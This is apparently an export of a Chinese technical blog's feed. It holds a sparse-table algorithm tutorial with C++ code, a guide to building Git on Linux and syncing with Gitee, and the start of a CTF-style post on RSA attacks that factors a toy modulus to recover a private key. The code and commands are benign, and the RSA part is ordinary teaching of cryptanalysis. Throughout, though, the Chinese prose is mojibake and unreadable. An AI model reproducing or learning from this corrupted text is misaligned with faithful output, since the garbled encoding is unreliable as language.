<li>å¯é‡å¤è´¡çŒ®é—®é¢˜ï¼šå®˜æ–¹æœ¯è¯­è§£é‡Šèµ·æ¥ä¸å¥½è§£é‡Šï¼Œä¸¾ä¸ªä¾‹å­ï¼šå‡å¦‚æˆ‘éœ€è¦æ±‚å‰é¢<code>8</code>ä¸ªæ•°å­—çš„æœ€å€¼ï¼Œæˆ‘å¯ä»¥å…ˆæ±‚è¿™<code>8</code>ä¸ªæ•°å­—ä¸­åå‰é¢çš„<code>6</code>ä¸ªä¸­çš„æœ€å€¼<code>number1</code>ï¼Œç„¶åå†æ±‚è¿™<code>8</code>ä¸ªæ•°å­—ä¸­ååé¢çš„æœ€å€¼<code>number2</code>ï¼Œç„¶åæ±‚<code>number1</code>å’Œ<code>number2</code>ä¸­äºŒè€…æœ€ä¼˜è€…å³å¯ï¼Œè¿™ä¸ªè¿‡ç¨‹ä½ ä¼šå‘ç°ä¸­é—´çš„å‡ ä¸ªæ•°å­—è¢«é‡å¤è®¡ç®—äº†ã€‚</li>
<li><code>ST</code>è¡¨ï¼šä¸€ç§æ•°æ®ç»“æ„ï¼Œè‹±æ–‡åä¸º<code>Sparse Table</code>ï¼Œå³ç¨€ç–è¡¨ã€‚</li>
</ul>
<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><h3 id="æ„å»º"><a href="#æ„å»º" class="headerlink" title="æ„å»º"></a>æ„å»º</h3><p><code>ST</code>è¡¨åº”ç”¨äº†å€å¢ä»¥åŠåŠ¨æ€è§„åˆ’çš„æ€æƒ³ã€‚</p>
<p>ä»¥æ±‚ç»™å®šåºåˆ—<code>number[]</code>çš„æœ€å¤§å€¼ä¸ºä¾‹ï¼š</p>
<p>å®šä¹‰<code>f[i][j]</code>ä¸ºåŒºé—´<code>[i, 2^j - 1]</code>å†…çš„æœ€å¤§å€¼ï¼ˆå³åŒ…æ‹¬<code>number[i]</code>ï¼‰ï¼Œç‰¹åˆ«çš„ï¼Œ<code>f[i][0]=number[i]</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">i					   							i + 2 ^ j - 1</span><br><span class="line">|------------------------------------------------|</span><br></pre></td></tr></table></figure>

<p>å¯¹äºä¸Šè¿°åŒºé—´ï¼Œé•¿åº¦ä¸º<code>2^(j)</code>ï¼Œä¸ºäº†æ±‚<code>f[i][j]</code>ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ±‚å‰åŠæ®µçš„æœ€å¤§å€¼ï¼Œå†æ±‚ååŠæ®µçš„æœ€å¤§å€¼ï¼Œç„¶åå–äºŒè€…ä¸­è¾ƒå¤§è€…ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">i					   							i + 2 ^ j - 1</span><br><span class="line">|------------------------------------------------|</span><br><span class="line">i          		i+2^(j-1)-1    i+2^(j-1) 			i + 2 ^ j - 1</span><br><span class="line">|--------------------------|   |----------------------|</span><br></pre></td></tr></table></figure>

<p>å³çŠ¶æ€è½¬ç§»æ–¹ç¨‹ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f[i][j] &#x3D; max(f[i][j - 1], f[i + (1 &lt;&lt; (j - 1))][j - 1])</span><br></pre></td></tr></table></figure>

<h3 id="æŸ¥è¯¢"><a href="#æŸ¥è¯¢" class="headerlink" title="æŸ¥è¯¢"></a>æŸ¥è¯¢</h3><p><code>ST</code>è¡¨æ„å»ºåä¹‹åï¼Œæˆ‘ä»¬è¿˜ä¸èƒ½ç›´æ¥æ‹¿è¿‡æ¥ç®€å•ä½¿ç”¨ï¼Œå› ä¸ºæ ¹æ®<code>ST</code>è¡¨çš„å®šä¹‰æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå½“éœ€è¦æ±‚çš„åŒºé—´é•¿åº¦æ˜¯<code>2</code>çš„æ•´æ•°å¹‚çš„æ—¶å€™ï¼Œ<code>f[][]</code>æ‰ä¸ºæ‰€éœ€è¦çš„ç­”æ¡ˆã€‚ä¾‹å¦‚æˆ‘è¦æ±‚çš„æ˜¯<code>left=3,right=8</code>çš„åŒºé—´ä¸­çš„æœ€å¤§å€¼ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3        6</span><br><span class="line">|--------|</span><br><span class="line">3            8</span><br><span class="line">|------------|</span><br><span class="line">3                 10</span><br><span class="line">|-----------------|</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶<code>f[3][2]</code>ä»£è¡¨ä¸Šé¢çš„åŒºé—´ï¼Œ<code>f[3][3]</code>ä»£è¡¨ä¸‹é¢çš„åŒºé—´ï¼Œè€Œæˆ‘ä»¬è¦æ±‚çš„æ˜¯ä¸­é—´çš„åŒºé—´ã€‚</p>
<p>æ­¤æ—¶å¯é‡å¤è´¡çŒ®é—®é¢˜çš„ä¼˜åŠ¿å°±ä½“ç°å‡ºæ¥äº†ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥æŠŠé—®é¢˜ä¸€èˆ¬åŒ–ï¼Œå‡è®¾è¦æ±‚çš„æ˜¯<code>[left,right]</code>çš„æœ€å¤§å€¼ï¼Œæ­¤æ—¶<code>log2(right - left)</code>ä¸æ˜¯æ•´æ•°ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥æŠŠæ‰€æ±‚çš„åŒºé—´åˆ†ä¸ºä¸¤ä¸ªå­åŒºé—´ï¼ˆå½“ç„¶ï¼Œè¿™ä¸¤ä¸ªåŒºé—´ä¹‹é—´æ˜¯æœ‰é‡å çš„ï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://qiniu.yalexin.top/ST%E8%A1%A8.png" alt></p>
<p><code>log2(len)</code>æ˜¯å¯¹<code>len</code>å–<code>2</code>å¯¹æ•°å¹¶ä¸‹å–æ•´ï¼Œæœ€ä¸Šé¢çš„åŒºé—´å’Œæœ€å°é¢çš„åŒºé—´é•¿åº¦éƒ½æ˜¯<code>2</code>çš„æ¬¡å¹‚ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°åˆ†åˆ«ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f[left][x]</span><br><span class="line">f[right - 2^x + 1][x]</span><br></pre></td></tr></table></figure>

<p>æ¥è¡¨ç¤ºï¼Œå…¶ä¸­<code>x=log2(right - left + 1)</code>å¹¶å‘ä¸‹å–æ•´ï¼ˆåŠ <code>1</code>åº”è¯¥å¾ˆå¥½ç†è§£ï¼‰,æ­¤æ—¶ä¸­é—´æ‰€è¦æ±‚çš„åŒºé—´å³ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f[left][right] &#x3D; max(f[left][x], f[right - 2^x + 1][x])</span><br></pre></td></tr></table></figure>

<h2 id="ç®—æ³•å®ç°"><a href="#ç®—æ³•å®ç°" class="headerlink" title="ç®—æ³•å®ç°"></a>ç®—æ³•å®ç°</h2><blockquote>
<p>é¢˜ç›®æ¥æºï¼šæ´›è°·<a href="https://www.luogu.com.cn/problem/P3865" target="_blank" rel="noopener">ã€æ¨¡æ¿ã€‘STè¡¨</a></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">1e5</span> + <span class="number">20</span>;</span><br><span class="line"><span class="keyword">int</span> f[MAX_N][<span class="number">25</span>], n, m;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>, flag = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> ch = getchar();</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch))&#123;<span class="keyword">if</span> (ch==<span class="string">'-'</span>) flag = <span class="number">1</span>; ch = getchar();&#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch))&#123;sum = (sum &lt;&lt; <span class="number">1</span>) + (sum &lt;&lt; <span class="number">3</span>) + ch<span class="number">-48</span>;ch = getchar();&#125;</span><br><span class="line">	<span class="keyword">return</span> flag ? -sum : sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pre</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)f[i][<span class="number">0</span>] = <span class="built_in">read</span>();</span><br><span class="line">    <span class="comment">// 2^17 &gt; 1e5</span></span><br><span class="line">    <span class="comment">// ä¸ºä»€ä¹ˆä»¥ j å¼€å§‹è¿›è¡Œæšä¸¾ iï¼Ÿ</span></span><br><span class="line">    <span class="comment">// å› ä¸º j æ˜¯æ§åˆ¶åŒºé—´é•¿åº¦çš„ï¼Œä¿è¯ 2^j çš„åŒºé—´æ˜¯ä¹‹å‰å°±å·²ç»æ±‚å¥½çš„</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">17</span>; j++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i + (<span class="number">1</span> &lt;&lt; j) - <span class="number">1</span> &lt;= n; i++)&#123;</span><br><span class="line">            f[i][j] = <span class="built_in">max</span>(f[i][j - <span class="number">1</span>], f[i + (<span class="number">1</span> &lt;&lt; (j - <span class="number">1</span>))][j - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    n = <span class="built_in">read</span>(), m = <span class="built_in">read</span>();</span><br><span class="line">    pre();</span><br><span class="line">    <span class="keyword">int</span> l, r, xlog2, ans;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        l = <span class="built_in">read</span>(), r = <span class="built_in">read</span>();</span><br><span class="line">        xlog2 = log2(r - l + <span class="number">1</span>);</span><br><span class="line">        ans = <span class="built_in">max</span>(f[l][xlog2], f[r - (<span class="number">1</span> &lt;&lt; xlog2) + <span class="number">1</span>][xlog2]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>STè¡¨</tag>
        <tag>åŠ¨æ€è§„åˆ’</tag>
      </tags>
  </entry>
  <entry>
    <title>Linuxå®‰è£…Gitã€ä¸Windowsç³»ç»Ÿå…³è”åŒä¸€ä¸ªç äº‘ä»“åº“</title>
    <url>/2020/07/06/Linux%E5%AE%89%E8%A3%85Git%E3%80%81%E4%B8%8EWindows%E7%B3%BB%E7%BB%9F%E5%85%B3%E8%81%94%E5%90%8C%E4%B8%80%E4%B8%AA%E4%BB%93%E5%BA%93/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ‰çš„æ—¶å€™éœ€è¦åœ¨äº‘ä¸»æœºä¸Šè·‘è·‘ç¨‹åºï¼Œä½†æ˜¯åœ¨æ²¡æœ‰å›¾å½¢ç•Œé¢çš„Linuxç³»ç»Ÿä¸Šï¼Œåˆ©ç”¨<code>vim</code>ç¼–å†™ä»£ç æ•ˆç‡è¿˜æ˜¯æ¯”è¾ƒä½ï¼Œå½“ç„¶å¯ä»¥åˆ©ç”¨<code>Xftp</code>ç›¸å…³çš„è½¯ä»¶ç›´æ¥å‘äº‘ä¸»æœºå‘é€æºç¨‹åºï¼Œä¹Ÿå¯ä»¥é€šè¿‡é‚®ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ä¸­è½¬ç«™ç­‰å…¶ä»–åŠæ³•ã€‚ä½†æ˜¯æˆ‘å‘ç°è¿™æ ·å­è¿˜æ˜¯ä¸å¤ªæ–¹ä¾¿ï¼Œä¸ºä»€ä¹ˆä¸åˆ©äºç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œåœ¨<code>Windows</code>ç³»ç»Ÿä¸Šåˆ©ç”¨<code>IDE</code>å¼€å‘å·¥å…·ç¼–å†™å¥½ä»£ç ï¼Œæ¨é€åˆ°è¿œç«¯ä»“åº“ï¼Œåœ¨<code>Linux</code>ç«¯æ‹‰å–ä»£ç ï¼Œè¿™æ ·å­ä¸æ˜¯æ›´åŠ æ–¹ä¾¿ï¼Ÿä¸‹é¢æˆ‘ä»‹ç»ä¸€ä¸‹è¯¥æ–¹æ³•ã€‚<a id="more"></a></p>
<p>åœ¨è¿™ä¹‹å‰éœ€è¦æ³¨å†Œä¸€ä¸ª<code>GitHub</code>è´¦æˆ·æˆ–è€…ç äº‘è´¦æˆ·ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯ç äº‘</p>
<h2 id="å®‰è£…Git"><a href="#å®‰è£…Git" class="headerlink" title="å®‰è£…Git"></a>å®‰è£…Git</h2><p>å¯ä»¥ä½¿ç”¨</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install git</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å­ç®€å•å¿«é€Ÿï¼Œä½†æ˜¯è¿™æ ·å­å®‰è£…çš„ç‰ˆæœ¬é€šå¸¸éƒ½æ˜¯éå¸¸ä½çš„ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œä¸ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä»<code>GitHub</code>ä¸Šé¢æ‰¾åˆ°è‡ªå·±å–œæ¬¢çš„ç‰ˆæœ¬ï¼Œä¸‹é¢å¼€å§‹æˆ‘ä»¬çš„æ­¥éª¤ï¼š</p>
<ol>
<li><p>å»<code>GitHub</code>ä¸Šé¢æœç´¢<code>git</code>ï¼Œè¿›å…¥åˆ°<code>release</code>é¡µé¢å¯»æ‰¾è‡ªå·±å–œæ¬¢çš„ç‰ˆæœ¬</p>
<p>ç„¶åä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ä¸‹è½½å®‰è£…åŒ…çš„å‹ç¼©åŒ…ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://codeload.github.com/git/git/tar.gz/v2.27.0</span><br></pre></td></tr></table></figure>

<p><code>v2.27.0</code>æ˜¯ç‰ˆæœ¬å·</p>
</li>
<li><p>è§£åŒ…è§£å‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf v2.27.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç¼–è¯‘æºç </p>
<p>è§£åŒ…è§£å‹å®Œæ¯•ï¼Œå°±ä¼šç”Ÿæˆ<code>git-2.27.0</code>æ–‡ä»¶å¤¹ï¼Œè¿›å…¥è¯¥æ–‡ä»¶å¤¹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd git-2.27.0</span><br></pre></td></tr></table></figure>

<p>ç†è®ºä¸Šè¯´ç°åœ¨å°±å¯ä»¥è¿›è¡Œç¼–è¯‘äº†ï¼Œä½†æ˜¯ç¼–è¯‘è¿‡ç¨‹å¯èƒ½ä¼šç¼ºå¤±ç›¸å…³åº“æ–‡ä»¶ï¼Œå› æ­¤å»ºè®®å…ˆå®‰è£…ç›¸å…³åº“æ–‡ä»¶ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel gcc perl-ExtUtils-MakeMaker</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œä¸Šé¢çš„æ­¥éª¤çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šå®‰è£…æ—§ç‰ˆçš„<code>Git</code>ï¼Œå› æ­¤éœ€è¦å…ˆåˆ é™¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum remove git</span><br></pre></td></tr></table></figure>

<p>å¼€å§‹ç¼–è¯‘</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make prefix=/usr/local/git all</span><br></pre></td></tr></table></figure>
</li>
<li><p>è®¾ç½®å®‰è£…è·¯å¾„</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make prefix=/usr/local/git install</span><br></pre></td></tr></table></figure>
</li>
<li><p>è®¾ç½®ç¯å¢ƒå˜é‡</p>
<p>æ‰“å¼€é…ç½®æ–‡ä»¶ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br></pre></td></tr></table></figure>

<p>åœ¨æœ€ä¸‹é¢åŠ ä¸Šï¼š</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">PATH</span>=<span class="string">$PATH:/usr/local/git/bin</span></span><br><span class="line"><span class="attr">export</span> <span class="string">PATH</span></span><br></pre></td></tr></table></figure>

<p>åˆ·æ–°é…ç½®æ–‡ä»¶ï¼Œä½¿å¾—æ–‡ä»¶ç”Ÿæ•ˆï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<p>æ£€æŸ¥ç‰ˆæœ¬:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure>

<p>å‡ºç°ç‰ˆæœ¬å·å°±è¯´æ˜<code>Git</code>å®‰è£…å¥½äº†</p>
</li>
</ol>
<h2 id="é…ç½®Git"><a href="#é…ç½®Git" class="headerlink" title="é…ç½®Git"></a>é…ç½®Git</h2><p>é…ç½®è´¦å·</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name "ç äº‘æ³¨å†Œçš„ç”¨æˆ·å"</span><br><span class="line">git config --global user.email "ç äº‘æ³¨å†Œçš„é‚®ç®±"</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆå¯†é’¥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "ç äº‘çš„é‚®ç®±"</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æŒ‰ä¸‹å›è½¦é”®å‡ æ¬¡å°±å¯ä»¥äº†</p>
<p><img src="https://q.yalexin.top/%E8%B7%AF%E5%BE%84.png" alt></p>
<p>çº¢è‰²åœˆä½çš„æ˜¯å¯†é’¥æ–‡ä»¶è·¯å¾„</p>
<p>ç›´åˆ°å‡ºç°ä¸‹é¢çš„ä¿¡æ¯å³å¯ï¼š</p>
<p><img src="https://q.yalexin.top/%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5.png" alt></p>
<p>æŸ¥çœ‹åˆšåˆšç”Ÿæˆçš„å¯†é’¥æ–‡ä»¶å†…å®¹:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /root/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>å¤åˆ¶ä¸Šé¢çš„ä¿¡æ¯ï¼Œåˆ°ç äº‘å¹³å°ä¸­çš„â€œè®¾ç½®â€ï¼Œâ€œSSHå…¬é’¥â€ä¸­æ·»åŠ åˆšåˆšå¤åˆ¶çš„ä¿¡æ¯å³å¯</p>
<h2 id="Windowsé…ç½®Git"><a href="#Windowsé…ç½®Git" class="headerlink" title="Windowsé…ç½®Git"></a>Windowsé…ç½®Git</h2><p>è¿™ä¸ªåº”è¯¥ä¸ä¼šå¤ªéš¾ï¼Œä½¿ç”¨å›¾å½¢åŒ–ç•Œé¢å®‰è£…ï¼Œä¸€ç›´<code>next</code>å³å¯ï¼Œæˆ–è€…å‚ç…§æˆ‘çš„å¦<a href="https://www.yalexin.top/index.php/archives/22/" target="_blank" rel="noopener">ä¸€ç¯‡æ–‡ç« </a>ã€‚</p>
<h2 id="å»ºç«‹ä»“åº“"><a href="#å»ºç«‹ä»“åº“" class="headerlink" title="å»ºç«‹ä»“åº“"></a>å»ºç«‹ä»“åº“</h2><p>åœ¨ç äº‘ç½‘ç«™æ–°å»ºä¸€ä¸ªä»“åº“</p>
<p>åœ¨<code>Linux</code>ç³»ç»Ÿçš„æŸä¸ªæ–‡ä»¶å¤¹ä¸‹ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">touch README.md</span><br><span class="line">git add .</span><br><span class="line">git commit -m "Linuxä¸‹çš„æäº¤"</span><br><span class="line">git remote add origin git@gitee.com:YaleXin/linux-windows.git # YaleXinæ˜¯ä½ çš„è´¦æˆ·åå­—ï¼Œlinux-windowsæ˜¯ä½ çš„åˆšåˆšæ–°å»ºçš„ä»“åº“</span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å­è¿œç«¯ä»“åº“å°±ä¼šå‡ºç°åˆšåˆšçš„<code>README.md</code>æ–‡ä»¶äº†</p>
<p>æ¥åˆ°<code>Windows</code>ç³»ç»Ÿç«¯ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿›å…¥è¯¥æ–‡ä»¶å¤¹ï¼Œå³é”®é¼ æ ‡ï¼Œç‚¹å‡»<code>Git Bash Here</code>ï¼Œè¾“å…¥ä¸‹é¢çš„å‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone git@gitee.com:YaleXin/linux-windows.git</span><br></pre></td></tr></table></figure>

<p>ç„¶åç®€å•ä¿®æ”¹ä¸€ä¸‹<code>README.md</code>æ–‡ä»¶</p>
<p>è¾“å…¥ä¸‹é¢å‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m "Windowsç³»ç»Ÿè¿›è¡Œä¿®æ”¹"</span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<p>å¦‚æœåœ¨<code>Windows</code>ç³»ç»Ÿä¸‹é…ç½®å¥½äº†<code>git</code>åï¼Œè¿œç«¯ä»“åº“å°±ä¼šå‡ºç°æ–°æ–‡ä»¶çš„å†…å®¹äº†</p>
<p>å›åˆ°<code>Linux</code>ç³»ç»Ÿä¸‹ï¼Œåœ¨ä¹‹å‰çš„ä»“åº“æ‰€åœ¨æ–‡ä»¶å¤¹ä¸‹è¾“å…¥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°ä»“åº“å°±ä¼šåŒæ­¥è¿œç«¯ä»“åº“çš„å†…å®¹äº†ã€‚å½“ç„¶äº†æœ‰å¯èƒ½ä¼šäº§ç”Ÿå†²çªï¼Œè§£å†³å†²çªåŠæ³•å‚ç…§å®˜ç½‘æˆ–è€…ç½‘ä¸Šå…¶ä»–å¸–å­å³å¯ã€‚</p>
<p>è¿™æ ·å­å°±ç®—æ˜¯åˆ©ç”¨è¿œç«¯ä»“åº“ï¼Œå®ç°äº‘ä¸»æœºå’Œæœ¬åœ°è¿›è¡Œäº’é€šäº†ï¼Œåç»­å°±å¯ä»¥åœ¨<code>Windows</code>ä¸Šåˆ©ç”¨<code>IDE</code>é›†æˆå¼€å‘ç¯å¢ƒè¿›è¡Œæ„‰å¿«åœ°ç¼–ç¨‹äº†ã€‚</p>
]]></content>
      <categories>
        <category>Linuxç›¸å…³</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>RSAçš„å¸¸è§æ”»å‡»</title>
    <url>/2022/08/15/RSA%E7%9A%84%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>æœ¬æ–‡å‚è€ƒè‡ªæ–‡ç« <a href="https://weread.qq.com/web/bookDetail/77d32500721a485577d8eee" target="_blank" rel="noopener">ã€ä»0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯-ç¬¬7ç« ã€‘</a></p>
<p>ä¸Šæ–‡æˆ‘ä»¬ä»‹ç»äº†RSAç®—æ³•åŸç†ï¼Œåªè¦æˆ‘ä»¬è®¾ç½®å¾—å½“ï¼Œæˆ‘ä»¬æœ‰è¶³å¤Ÿå¤šçš„ç†ç”±ç›¸ä¿¡æˆ‘ä»¬çš„RSAç³»ç»Ÿæ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯ç²—å¿ƒçš„æˆ‘ä»¬ï¼Œèƒ½å¦ç¦å¾—ä½é»‘å®¢çš„æ”»åŸæ æ± ï¼Ÿä¸‹é¢ä»‹ç»ä¸€äº›RSAçš„å¸¸è§æ”»å‡»ã€‚<a id="more"></a></p>
<h2 id="1-å› å¼åˆ†è§£"><a href="#1-å› å¼åˆ†è§£" class="headerlink" title="1.å› å¼åˆ†è§£"></a>1.å› å¼åˆ†è§£</h2><p>äº§ç”Ÿå…¬é’¥å’Œç§é’¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç”¨åˆ°äº†pï¼Œqï¼Œeï¼Œæˆ‘ä»¬å¯¹å¤–å…¬å¸ƒçš„æ˜¯på’Œqçš„ä¹˜ç§¯ä»¥åŠeã€‚å¦‚æœæˆ‘ä»¬é€‰ç”¨çš„på’Œqå¤ªå°ï¼Œå¾ˆå®¹æ˜“å°±è¢«å¾ˆå¤šå·¥å…·å°†äºŒè€…çš„ä¹˜ç§¯è¿›è¡Œå› å¼åˆ†è§£ï¼Œä»è€Œè·å¾—äº†på’Œqã€‚</p>
<p>æœ‰å¾ˆå¤šåœ¨çº¿å·¥å…·å¯ä»¥å°†å¤§æ•°è¿›è¡Œå› å¼åˆ†è§£ï¼Œä¹Ÿæœ‰ä¸€äº›å¼€æºå·¥å…·ï¼Œè¿™é‡Œä»¥<a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">Yafu</a>ä¸ºä¾‹,å¯¹äºé˜¿ççš„å…¬é’¥&lt;n,e&gt;=&lt;16422644908304291,65537&gt;</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D:\HackTools\yafu-1.34&gt;yafu-x64.exe</span><br><span class="line">factor(16422644908304291)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fac: factoring 16422644908304291</span><br><span class="line">fac: using pretesting plan: normal</span><br><span class="line">fac: no tune info: using qs/gnfs crossover of 95 digits</span><br><span class="line">div: primes less than 10000</span><br><span class="line">fmt: 1000000 iterations</span><br><span class="line">Total factoring time = 0.0058 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">***factors found***</span><br><span class="line"></span><br><span class="line">P9 = 134235139</span><br><span class="line">P9 = 122342369</span><br><span class="line"></span><br><span class="line">ans = 1</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­ä½¿ç”¨<code>python</code>çš„<code>Gmpy2</code>åº“å¯ä»¥å¾ˆå®¹æ˜“æ±‚é€†å…ƒï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p, q, e = <span class="number">134235139</span>, <span class="number">122342369</span>, <span class="number">65537</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="comment"># æ±‚ e mod phi çš„é€†å…ƒ</span></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">print(d)</span><br><span class="line"><span class="comment"># 8237257961022977</span></span><br></pre></td></tr></table></figure>

<p>æ­¤å¤–ï¼Œå¦‚æœ<code>p</code>å’Œ<code>q</code>çš„å·®è·è¾ƒå°ï¼Œæ ¹æ®ä¸‹é¢çš„å¼å­ï¼š<br>$$<br>(\frac{p+q}{2} )^2-pq=(\frac{p-q}{2} )^2<br>$$<br>ç›´æ¥æš´åŠ›æšä¸¾<code>p</code>å’Œ<code>q</code>çš„å·®å€¼ï¼Œå¯»æ‰¾<code>p</code>å’Œ<code>q</code></p>
